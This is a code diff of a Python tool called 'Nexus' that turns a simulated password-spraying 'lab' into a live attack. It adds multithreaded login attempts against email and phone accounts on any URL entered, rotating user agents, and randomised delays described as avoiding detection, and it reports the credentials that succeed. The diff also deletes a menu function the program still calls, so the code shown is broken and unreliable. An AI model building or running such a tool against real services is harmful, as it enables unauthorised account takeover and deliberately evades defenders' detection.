@@ -3,6 +3,9 @@ import time
 import requests
 import os
 import sys
+import random
+import threading
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
 # ANSI Color Codes for Terminal
@@ -19,19 +22,16 @@ class Colors:
     END = '\033[0m'
 
 CONFIG_FILE = "config.json"
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+]
 
 def load_config():
-    try:
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    except FileNotFoundError:
-        return {
-            "lab_info": {"name": "Nexus Security Suite", "version": "5.0", "author": "Nexus Team"},
-            "server_settings": {"mode": "local", "local_url": "http://127.0.0.1:5000", "custom_url": "", "timeout": 5},
-            "targets": {"emails": [], "phones": []},
-            "passwords_to_test": ["123456", "password123"],
-            "scan_settings": {"delay_between_requests": 0.5, "max_attempts": 10, "show_full_response": False, "verbose": True}
-        }
+    with open(CONFIG_FILE, 'r') as f:
+        return json.load(f)
 
 def save_config(config):
     with open(CONFIG_FILE, 'w') as f:
@@ -49,63 +49,58 @@ def show_banner():
 ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
 ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-{Colors.PURPLE}Professional Password Spraying Lab v5.0{Colors.END}
+{Colors.PURPLE}High-Efficiency Password Spraying Lab v6.0{Colors.END}
 {Colors.DIM}--------------------------------------------------{Colors.END}
     """
     print(banner)
 
-def main_menu():
-    clear_screen()
-    show_banner()
-    print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
-    print(f"{Colors.GREEN}[1]{Colors.END} Run Security Scan")
-    print(f"{Colors.GREEN}[2]{Colors.END} Target Configuration")
-    print(f"{Colors.GREEN}[3]{Colors.END} Server Settings")
-    print(f"{Colors.GREEN}[4]{Colors.END} Scan Parameters")
-    print(f"{Colors.RED}[0]{Colors.END} Exit")
+def spray_task(target, password, url, config):
+    headers = {}
+    if config['advanced_settings']['random_user_agents']:
+        headers['User-Agent'] = random.choice(USER_AGENTS)
     
-    choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
-    return choice
+    try:
+        # Smart Delay to avoid detection
+        delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
+        time.sleep(delay)
+        
+        response = requests.post(f"{url}/login", json={"username": target, "password": password}, headers=headers, timeout=config['server_settings']['timeout'])
+        
+        if response.status_code == 200:
+            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
+            return True
+        elif config['scan_settings']['verbose']:
+            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} (Failed){Colors.END}\n")
+    except Exception as e:
+        print(f"\n{Colors.RED}[!] Connection Error on {target}: {e}{Colors.END}")
+    return False
 
-def run_scan():
+def run_high_efficiency_scan():
     config = load_config()
     clear_screen()
     show_banner()
     
     url = config['server_settings']['local_url'] if config['server_settings']['mode'] == "local" else config['server_settings']['custom_url']
+    targets = config['targets']['emails'] + config['targets']['phones']
+    passwords = config['passwords_to_test']
+    threads = config['advanced_settings']['threads']
     
-    if not url:
-        print(f"{Colors.RED}[!] Error: No URL configured!{Colors.END}")
+    if not targets or not passwords:
+        print(f"{Colors.RED}[!] Targets or Passwords list is empty!{Colors.END}")
         time.sleep(2)
         return
 
     print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{Colors.END}")
-    print(f"{Colors.YELLOW}Initiating Password Spraying Attack (Educational Mode)...{Colors.END}\n")
-    
-    emails = config['targets']['emails']
-    phones = config['targets']['phones']
-    all_targets = emails + phones
-    passwords = config['passwords_to_test']
-    
-    if not all_targets:
-        print(f"{Colors.RED}[!] No targets configured!{Colors.END}")
-        time.sleep(2)
-        return
+    print(f"{Colors.YELLOW}Threads: {Colors.CYAN}{threads}{Colors.END} | Smart Delay: {Colors.CYAN}Enabled{Colors.END}")
+    print(f"{Colors.YELLOW}Initiating High-Efficiency Spray...{Colors.END}\n")
 
-    for target in all_targets:
-        print(f"{Colors.BLUE}[*] Spraying Target: {Colors.WHITE}{target}{Colors.END}")
+    # High Efficiency Multi-threading
+    with ThreadPoolExecutor(max_workers=threads) as executor:
         for pwd in passwords:
-            sys.stdout.write(f"    {Colors.DIM}Testing: {pwd}{Colors.END}\r")
-            sys.stdout.flush()
-            try:
-                # Simulation of scanning logic
-                time.sleep(config['scan_settings']['delay_between_requests'])
-                # status = requests.post(f"{url}/login", json={"u": target, "p": pwd}, timeout=2).status_code
-                # if status == 200: print(f"\n{Colors.GREEN}[+] FOUND: {target}:{pwd}{Colors.END}")
-            except Exception as e:
-                print(f"\n{Colors.RED}[!] Connection Error: {e}{Colors.END}")
-                break
-        print(f"\n{Colors.GREEN}[✓] Scan complete for {target}{Colors.END}\n")
+            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying all targets with password: {pwd}{Colors.END}")
+            futures = [executor.submit(spray_task, target, pwd, url, config) for target in targets]
+            for f in futures: f.result()
+            print(f"{Colors.DIM}--- Finished spraying password: {pwd} ---{Colors.END}\n")
     
     input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")
 
@@ -121,7 +116,6 @@ def target_config():
         print(f"{Colors.RED}[0]{Colors.END} Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
-        
         if choice == '1':
             print(f"\nCurrent Emails: {config['targets']['emails']}")
             new = input("Add new email (or 'clear' to reset): ")
@@ -151,27 +145,39 @@ def server_config():
         print(f"{Colors.YELLOW}[ Server Configuration ]{Colors.END}")
         print(f"Current Target: {Colors.CYAN}{config['server_settings']['local_url'] if config['server_settings']['mode'] == 'local' else config['server_settings']['custom_url']}{Colors.END}")
         print(f"Current Mode: {Colors.PURPLE}{config['server_settings']['mode'].upper()}{Colors.END}\n")
-        
-        print(f"{Colors.GREEN}[1]{Colors.END} Switch to LOCAL Server (127.0.0.1:5000)")
-        print(f"{Colors.GREEN}[2]{Colors.END} Set CUSTOM Server URL (Any Link)")
-        print(f"{Colors.GREEN}[3]{Colors.END} Edit Local Server URL")
+        print(f"{Colors.GREEN}[1]{Colors.END} Switch to LOCAL Server")
+        print(f"{Colors.GREEN}[2]{Colors.END} Set CUSTOM Server URL")
         print(f"{Colors.RED}[0]{Colors.END} Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
-        
         if choice == '1':
             config['server_settings']['mode'] = "local"
-            print(f"{Colors.GREEN}[✓] Switched to Local Server Mode.{Colors.END}")
-            time.sleep(1)
+            save_config(config)
         elif choice == '2':
-            new_url = input(f"{Colors.YELLOW}Enter any server URL (e.g., https://api.target.com): {Colors.END}")
+            new_url = input("Enter custom URL: ")
             if new_url:
                 config['server_settings']['custom_url'] = new_url
                 config['server_settings']['mode'] = "custom"
-                print(f"{Colors.GREEN}[✓] Custom Server URL set and activated.{Colors.END}")
-                time.sleep(1)
-        elif choice == '3':
-            config['server_settings']['local_url'] = input(f"{Colors.YELLOW}Enter Local URL: {Colors.END}")
+                save_config(config)
+        elif choice == '0':
+            break
+
+def advanced_config():
+    while True:
+        config = load_config()
+        clear_screen()
+        show_banner()
+        print(f"{Colors.YELLOW}[ Advanced Settings ]{Colors.END}")
+        print(f"1. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
+        print(f"2. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
+        print(f"3. Smart Delay: {Colors.CYAN}{config['advanced_settings']['smart_delay']}{Colors.END}")
+        print(f"0. Back")
+        
+        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Advanced > {Colors.END}")
+        if choice == '1':
+            config['advanced_settings']['threads'] = int(input("Enter number of threads: "))
+        elif choice == '2':
+            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
         elif choice == '0':
             break
         save_config(config)
@@ -180,26 +186,18 @@ def start():
     while True:
         choice = main_menu()
         if choice == '1':
-            run_scan()
+            run_high_efficiency_scan()
         elif choice == '2':
             target_config()
         elif choice == '3':
             server_config()
         elif choice == '4':
-            config = load_config()
-            clear_screen()
-            show_banner()
-            print(f"{Colors.YELLOW}[ Scan Parameters ]{Colors.END}")
-            delay = input(f"Current Delay ({config['scan_settings']['delay_between_requests']}s). New delay: ")
-            if delay: config['scan_settings']['delay_between_requests'] = float(delay)
-            save_config(config)
+            advanced_config()
         elif choice == '0':
-            print(f"{Colors.GREEN}Exiting Nexus...{Colors.END}")
             sys.exit()
 
 if __name__ == "__main__":
     try:
         start()
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}Session Terminated.{Colors.END}")
         sys.exit()
